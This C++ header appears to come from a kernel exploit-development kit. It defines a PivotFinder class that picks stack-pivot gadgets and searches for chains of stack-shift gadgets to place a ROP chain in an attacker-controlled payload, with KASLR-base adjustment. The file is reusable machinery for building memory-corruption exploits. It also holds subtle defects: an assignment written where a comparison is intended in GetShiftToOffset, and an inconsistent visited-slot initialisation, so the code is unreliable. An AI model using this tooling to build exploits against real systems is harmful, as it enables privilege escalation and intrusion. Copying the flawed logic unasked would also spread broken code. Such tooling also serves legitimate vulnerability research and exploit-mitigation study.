#pragma once

#include <limits>
#include <optional>
#include <queue>
#include "pivot/Pivots.cpp"
#include "pivot/StackPivot.cpp"
#include "payloads/Payload.h"
#include "payloads/RopChain.h"
#include "util/stdutils.cpp"

/**
 * @brief Represents information about a single stack shifting gadget within a chain.
 */
struct StackShiftInfo {
    /// @brief The offset within the payload where the address of this stack shift pivot is written.
    uint64_t ret_offset;
    /// @brief The stack shift pivot gadget.
    const StackShiftPivot pivot;
};

/**
 * @brief Stores information about a chain of stack shifting gadgets.
 */
struct StackShiftingInfo {
    /// @brief A vector of individual stack shift gadget information.
    std::vector<StackShiftInfo> stack_shifts;
    /// @brief The starting offset within the payload where the first stack shift pivot address is written.
    uint64_t from_offset;
    uint64_t to_offset;
    uint64_t next_ret_offset;

    void Apply(uint64_t kaslr_base, Payload& payload) {
        for (auto& shift : stack_shifts) {
            payload.Set(shift.ret_offset, kaslr_base + shift.pivot.address);
        }
    }
};

/**
 * @brief Encapsulates information about a successful ROP pivot.
 */
struct RopPivotInfo {
    /** @brief The ROP chain being pivoted to. */
    const RopChain& rop;
    /** @brief The chosen stack pivot gadget. */
    StackPivot pivot;
    /** @brief The minimum required offset for the ROP chain after shifting. */
    uint64_t rop_min_offset;
    /** @brief The actual offset within the payload where the ROP chain is placed. */
    uint64_t rop_offset;
    /** @brief Information about the stack shifting performed. */
    StackShiftingInfo stack_shift;

    /**
     * @brief Prints debug information about the ROP pivot.
     *
     * This includes details about the selected stack pivot, stack shifts, and ROP chain offset.
     */
    // TODO: make this more universal
    void PrintDebugInfo() const {
        printf("[+] Selected stack pivot: %s\n", pivot.GetDescription().c_str());

        for (auto& shift : stack_shift.stack_shifts)
            printf("[+] Stack jump @0x%lx: 0x%lx -> 0x%lx (size: 0x%lx)\n", shift.pivot.address,
                shift.ret_offset, shift.ret_offset + shift.pivot.shift_amount, shift.pivot.shift_amount);

        printf("[+] ROP chain offset: 0x%lx\n", rop_offset);
    }
};

/**
 * @brief Finds suitable stack pivots and stack shifting gadgets within a payload.
 */
class PivotFinder {
    Pivots pivots_;
    std::set<Register> buf_regs_;
    Payload& payload_;

    /**
     * @brief Internal helper function to find stack pivot gadgets.
     *
     * This function searches for both one-gadget and push/indirect/pop RSP
     * style pivots that are compatible with the current payload state and buffer registers.
     *
     * @param only_one If true, stops after finding the first suitable pivot.
     * @param free_bytes_after The minimum number of free bytes required after the pivot's next RIP offset.
     * @return A vector of found StackPivot objects.
     */
    std::vector<StackPivot> FindInternal(bool only_one, uint64_t free_bytes_after = 0) {
        auto snapshot = payload_.Snapshot(); // run on snapshot to avoid increasing bytes used
        std::vector<StackPivot> result;

        for (auto& gadget : pivots_.one_gadgets) {
            if (!CheckOneGadget(gadget, free_bytes_after))
                continue;

            result.push_back(StackPivot(gadget));
            if (only_one)
                return result;
        }

        for (auto& push : pivots_.push_indirects) {
            if (!CheckPushIndirect(push, free_bytes_after))
                continue;

            snapshot.Reserve(push.next_rip_offset, 8);

            for (auto& pop : pivots_.pop_rsps) {
                auto push_change = push.indirect_type == IndirectType::CALL ? 8 : 0;
                if (pop.stack_change_before_rsp != push_change ||
                    !snapshot.CheckFree(pop.next_rip_offset, 8 + free_bytes_after))
                        continue;

                    result.push_back(StackPivot(push, pop));
                    if (only_one)
                        break;
            }

            snapshot.Release(push.next_rip_offset, 8);

            if (only_one && !result.empty())
                break;
        }

        return result;
    }

    /**
     * @brief Sorts the internal lists of pivot gadgets by their next RIP offset or shift amount.
     *
     * Sorting helps in finding the most suitable gadgets efficiently.
     */
    void SortFields(){
        sortByField<OneGadgetPivot>(pivots_.one_gadgets, [](auto& a) { return a.next_rip_offset; });
        sortByField<PushIndirectPivot>(pivots_.push_indirects, [](auto& a) { return a.next_rip_offset; });
        sortByField<PopRspPivot>(pivots_.pop_rsps, [](auto& a) { return a.next_rip_offset; });
        sortByField<StackShiftPivot>(pivots_.stack_shifts, [](auto& a) { return a.shift_amount; });
    }

public:
    /**
     * @brief Constructs a PivotFinder object with a single buffer register.
     *
     * @param pivots The collection of available pivot gadgets.
     * @param buf_reg The single register pointing to the target buffer.
     * @param payload The payload object to operate on.
     */
    PivotFinder(const Pivots &pivots,
                Register buf_reg,
                Payload &payload)
        : pivots_(pivots), buf_regs_({buf_reg}), payload_(payload)
    {
        SortFields();
    }

    /**
     * @brief Constructs a PivotFinder object with multiple buffer registers.
     *
     * @param pivots The collection of available pivot gadgets.
     * @param buf_regs A vector of registers pointing to the target buffer.
     * @param payload The payload object to operate on.
     */
    PivotFinder(const Pivots &pivots,
                std::vector<Register> buf_regs,
                Payload &payload)
        : pivots_(pivots), buf_regs_(buf_regs.begin(), buf_regs.end()), payload_(payload)
    {
        SortFields();
    }

    /**
     * @brief Checks if a given register usage is compatible with the buffer registers
     * and doesn't overlap with reserved space in the payload.
     *
     * @param reg The RegisterUsage to check.
     * @return True if the register usage is valid for pivoting, false otherwise.
     * @note This function has TODOs related to more advanced checks for RIP control and skipping used space.
     */
    bool CheckRegister(const RegisterUsage& reg) {
        // Check it's using a register pointing at this buffer
        if (buf_regs_.find(reg.reg) == buf_regs_.end())
            return false;

        // TODO: it can be used as long as it is not used for RIP control (just pre-RIP control vuln trigger)
        // TODO: it is also possible that we can jump over it
        for (auto offs : reg.used_offsets)
            if (!payload_.CheckFree(offs, 8))
                return false;

        return true;
    }

    /**
     * @brief Checks if a One-Gadget pivot is valid for the current payload state.
     *
     * @param pivot The OneGadgetPivot to check.
     * @param free_bytes_after The minimum number of free bytes required after the pivot's next RIP offset.
     * @return True if the One-Gadget pivot is valid, false otherwise.
     */
    bool CheckOneGadget(const OneGadgetPivot& pivot, uint64_t free_bytes_after = 0) {
        return CheckRegister(pivot.pivot_reg) &&
               payload_.CheckFree(pivot.next_rip_offset, 8 + free_bytes_after);
    }

    /**
     * @brief Checks if a Push/Indirect pivot is valid for the current payload state.
     *
     * @param pivot The PushIndirectPivot to check.
     * @param free_bytes_after The minimum number of free bytes required after the pivot's next RIP offset.
     * @return True if the Push/Indirect pivot is valid, false otherwise.
     */
    bool CheckPushIndirect(const PushIndirectPivot& pivot, uint64_t free_bytes_after = 0) {
        return CheckRegister(pivot.push_reg) &&
               CheckRegister(pivot.indirect_reg) &&
               payload_.CheckFree(pivot.next_rip_offset, 8 + free_bytes_after);
    }

    /**
     * @brief Finds all suitable stack pivot gadgets.
     *
     * @return A vector containing all found StackPivot objects.
     */
    std::vector<StackPivot> FindAll() {
        return FindInternal(false);
    }

    /**
     * @brief Finds a stack shift gadget with a shift amount greater than or equal
     * to `min_shift` and less than `upper_bound`.
     *
     * @param min_shift The minimum required stack shift amount.
     * @param upper_bound The exclusive upper bound for the stack shift amount.
     * @return An optional StackShiftPivot if a suitable gadget is found, otherwise `std::nullopt`.
     */
    std::optional<StackShiftPivot> FindShift(uint64_t min_shift, uint64_t upper_bound = std::numeric_limits<uint64_t>::max()) {
        // Find the minimum shift_amount >= min_shift
        for (const auto &pivot : pivots_.stack_shifts)
        {
            // Only consider shifts which have the next rip in the last position for now
            if (pivot.shift_amount >= min_shift &&
                pivot.shift_amount < upper_bound &&
                pivot.JumpsToShift())
            {
                return pivot;
            }
        }

        // No match found
        return std::nullopt;
    }

    /**
     * @brief Finds a single suitable stack pivot gadget.
     *
     * @param free_bytes_after The minimum number of free bytes required after the pivot's next RIP offset.
     * @return An optional StackPivot object. Contains a value if a pivot is found, otherwise `std::nullopt`.
     */
    std::optional<StackPivot> Find(uint64_t free_bytes_after = 0) {
        auto result = FindInternal(true, free_bytes_after);
        return result.empty() ? std::nullopt : std::optional(result[0]);
    }

    /**
     * @brief Finds a sequence of stack shift gadgets to shift the stack pointer
     * from a given offset to at least a minimum target offset.
     *
     * @param from_offset The starting offset of the stack pointer.
     * @param min_to_offset The minimum desired offset for the stack pointer.
     * @return An optional StackShiftingInfo object. Contains a value if a sequence of shifts is found, otherwise `std::nullopt`.
     */
    std::optional<StackShiftingInfo> GetShiftToOffset(uint64_t from_offset, uint64_t min_to_offset) {
        std::optional<StackShiftingInfo> shift_info = FindShiftsInternal(from_offset, min_to_offset, std::nullopt);
        if (!shift_info) return std::nullopt;

        // "clean up" in case the last gadget didn't end with ret and sp aligned
        // e.g. in the case of retn 0x10, we will add a ret gadget as the retn 0x10 return
        if (shift_info->next_ret_offset != shift_info->to_offset-8) {
            shift_info->stack_shifts.push_back({shift_info->next_ret_offset, GetSingleRet()});
            shift_info->next_ret_offset = shift_info->to_offset;
        }
        // "clean up" the to_offset to be the same as the next_ret_offset
        if (shift_info->next_ret_offset = shift_info->to_offset-8) {
            shift_info->to_offset = shift_info->next_ret_offset;
        }
        return shift_info;
    }

    /**
     * @brief Finds a sequence of stack shift gadgets to shift the stack pointer
     * to accommodate a ROP chain of a given size.
     *
     * @param from_offset The starting offset of the stack pointer.
     * @param byte_size The size of the ROP chain in bytes.
     * @param include_extra_slot If true, includes an extra 8 bytes in the required space.
     * @return An optional StackShiftingInfo object. Contains a value if a sequence of shifts is found, otherwise `std::nullopt`.
     */
    std::optional<StackShiftingInfo> GetShiftToRop(uint64_t from_offset, uint64_t byte_size, bool include_extra_slot) {
        // search for min_next_space = rop_size-8
        // because the first gadget is put in the next_ret_offset
        if(byte_size == 0) throw ExpKitError("byte_size is 0");
        uint64_t search_size = byte_size-8;
        if (include_extra_slot) search_size += 8;
        return FindShiftsInternal(from_offset, std::nullopt, search_size);
    }

    /**
     * @brief Internal helper function to find a sequence of stack shift gadgets using a breadth-first search.
     *
     * The search aims to find a path of stack shifts that results in a stack pointer
     * offset that meets either the minimum target offset or provides sufficient free space.
     *
     * @param from_offset The starting offset of the stack pointer.
     * @param min_to_offset An optional minimum desired offset for the stack pointer.
     * @param min_next_space An optional minimum required free space at the final stack pointer offset.
     * @return An optional StackShiftingInfo object. Contains a value if a sequence of shifts is found, otherwise `std::nullopt`.
     * @throws ExpKitError if both `min_to_offset` and `min_next_space` are not set.
     */
    std::optional<StackShiftingInfo> FindShiftsInternal(uint64_t from_offset, std::optional<uint64_t> min_to_offset, std::optional<uint64_t> min_next_space) {
        if(!min_to_offset && !min_next_space) {
            throw ExpKitError("Internal error, min_to_offset or min_next_space should be set");
        }

        std::queue<std::pair<uint64_t, std::vector<StackShiftPivot>>> q; // (next_sp, path)
        std::vector<bool> visited(payload_.Size(), false);

        std::vector<std::pair<uint64_t, std::vector<StackShiftPivot>>> finished;

        /*
        Goal is to get next_sp at least to min_to_offset using shifts
        each shift shifts sp and must have next_ret_offset free

        Example:
        from_offset=0x0, min_to_offset=0x18
        two gadgets which both add 0x18 to SP
        "add rsp, 0x10; ret"
        "retn 0x10"

            A "ret" is about to be executed, sp points at offset 0

            After executing that ret, sp will be +8
            RIP will point at the first chosen gadget

            "add rsp, 0x10; ret" ->
                sp+=0x18 = 0x20
                next_ret = 0x18
            "retn 0x10" ->
                sp += 0x18 = 0x20
                next_ret = 0x8

        Use a breadth first search with a visited[] vector for each seen SP value
        */
        uint64_t current_ret_loc = from_offset;
        uint64_t sp_after_prev_inst = from_offset+8;

        q.push({sp_after_prev_inst, {}}); // SP starts one slot after from_offset with an empty path
        visited[0] = true;

        while (!q.empty()) {
            uint64_t sp = q.front().first;
            std::vector<StackShiftPivot> current_path = std::move(q.front().second);
            q.pop();

            if ((!min_to_offset || sp >= *min_to_offset) &&
                        (!min_next_space || payload_.CheckFree(sp, *min_next_space))) {
                finished.push_back({sp, current_path});
                continue;
            }

            // check each pivot to see if it is applicable
            for (int i = 0; i < pivots_.stack_shifts.size(); i++) {
                StackShiftPivot pivot = pivots_.stack_shifts[i];

                uint64_t new_sp = sp+pivot.shift_amount;
                // skip shifts which shift past the payload
                if (new_sp > payload_.Size()) continue;

                // skip shifts to a position we've already visited
                if (visited[new_sp]) continue;

                // skip shifts which don't have a free ret_offset
                uint64_t next_ret_off = sp+pivot.ret_offset;
                if (!payload_.CheckFree(next_ret_off, 8)) {
                    continue;
                }

                // add current pivot
                std::vector<StackShiftPivot> copy = current_path;
                copy.push_back(pivot);

                q.push({new_sp, std::move(copy)});
                // mark visited
                visited[new_sp] = true;
            }
        }

        if (finished.size() == 0) {
            return std::nullopt;
        }

        // now pick one with the smallest final sp change
        uint64_t smallest_sp = finished[0].first;
        std::vector<StackShiftPivot> smallest = finished[0].second;
        for(auto &pair : finished) {
            if (pair.first < smallest_sp) {
                smallest_sp = pair.first;
                smallest = pair.second;
            }
        }

        return GetShiftInfoFromChain(smallest, from_offset);
    }

    /**
     * @brief Converts a chain of StackShiftPivot gadgets into a StackShiftingInfo structure.
     *
     * This function calculates the resulting offsets and populates the `StackShiftInfo`
     * vector based on the provided chain of gadgets and the starting offset.
     *
     * @param chain The vector of StackShiftPivot gadgets forming the chain.
     * @param from_offset The starting offset of the stack pointer before the shifts.
     * @return A StackShiftingInfo structure describing the sequence of shifts.
     */
    StackShiftingInfo GetShiftInfoFromChain(const std::vector<StackShiftPivot> &chain, uint64_t from_offset) {
        /*
        Turns a chain of stack shift gadgets into a vector of StackShiftInfo
        */
        std::vector<StackShiftInfo> shift_info;

        // first address is stored at "from_offset"
        uint64_t ret_offset = from_offset;
        uint64_t sp_offset = from_offset + 8; // move one slot for first ret
        for (const StackShiftPivot stack_shift : chain) {
            uint64_t next_ret = sp_offset + stack_shift.ret_offset;
            sp_offset += stack_shift.shift_amount;
            shift_info.push_back({ret_offset, stack_shift});
            ret_offset = next_ret;
        }
        return StackShiftingInfo { shift_info, from_offset, sp_offset, ret_offset};
    }

    /**
     * @brief Applies a sequence of stack shifts to the payload to reach at least a minimum target offset.
     *
     * @param kaslr_base The Kernel Address Space Layout Randomization base address.
     * @param from_offset The starting offset of the stack pointer.
     * @param min_to_offset The minimum desired offset for the stack pointer.
     * @return The final offset of the stack pointer after applying the shifts.
     * @throws ExpKitError if a suitable stack shift gadget sequence cannot be found.
     */
    uint64_t ApplyShift(uint64_t kaslr_base, uint64_t from_offset, uint64_t min_to_offset) {
        auto shifts = GetShiftToOffset(from_offset, min_to_offset);
        if (!shifts.has_value())
            throw ExpKitError("could not find a right stack shift gadget");
        shifts->Apply(kaslr_base, payload_);
        return shifts->to_offset;
    }

    /**
     * @brief Attempts to find a stack pivot and a sequence of stack shifts
     * to pivot to a given ROP chain.
     *
     * @param rop The ROP chain to pivot to.
     * @return A RopPivotInfo structure containing information about the successful pivot and shifts.
     * @throws ExpKitError if a suitable pivot and shift sequence cannot be found.
     * @note This function iterates through found pivots and attempts to apply shifts until a working combination is found.
     */
    RopPivotInfo PivotToRop(const RopChain& rop) {
        auto snapshot = payload_.Snapshot();
        for (auto& pivot : FindInternal(false)) {
            payload_.Restore(snapshot);
            pivot.ApplyToPayload(payload_, rop.kaslr_base_);

            auto shifts = GetShiftToRop(pivot.GetDestinationOffset(), rop.GetByteSize(), false);
            if(!shifts) continue;

            shifts->Apply(rop.kaslr_base_, payload_);
            std::vector<uint64_t> rop_words = rop.GetDataWords();
            payload_.Set(shifts->next_ret_offset, rop_words[0]);

            uint64_t payload_off = shifts->to_offset;
            for(uint64_t i = 1; i < rop_words.size(); i++) {
                payload_.Set(payload_off, rop_words[i]);
                payload_off += 8;
            }
            return RopPivotInfo { rop, pivot, shifts->to_offset, shifts->to_offset, *shifts };
        }

        payload_.Restore(snapshot);
        throw ExpKitError("could not pivot");
    }

    /**
     * @brief Finds a simple "pop rsp; ret" gadget that doesn't change the stack
     * before the RSP update and has its next RIP immediately after the gadget.
     *
     * @return An optional PopRspPivot. Contains a value if such a gadget is found, otherwise `std::nullopt`.
     */
    std::optional<PopRspPivot> GetPopRsp() {
        for (const auto &pivot : pivots_.pop_rsps)
            if (pivot.stack_change_before_rsp == 0 && pivot.next_rip_offset == 0)
                return std::optional(pivot);
        return std::nullopt;
    }

    /**
     * @brief Finds a simple "ret" gadget that shifts the stack by 8 bytes and jumps to the shifted location.
     *
     * @return A StackShiftPivot representing a simple "ret".
     */
    StackShiftPivot GetSingleRet() {
        // should always work, otherwise throw
        for(const StackShiftPivot& pivot : pivots_.stack_shifts) {
            if (pivot.JumpsToShift() && pivot.shift_amount == 8)
                return pivot;
        }
        throw ExpKitError("could not find a shift which is just 'ret'");
    }
};
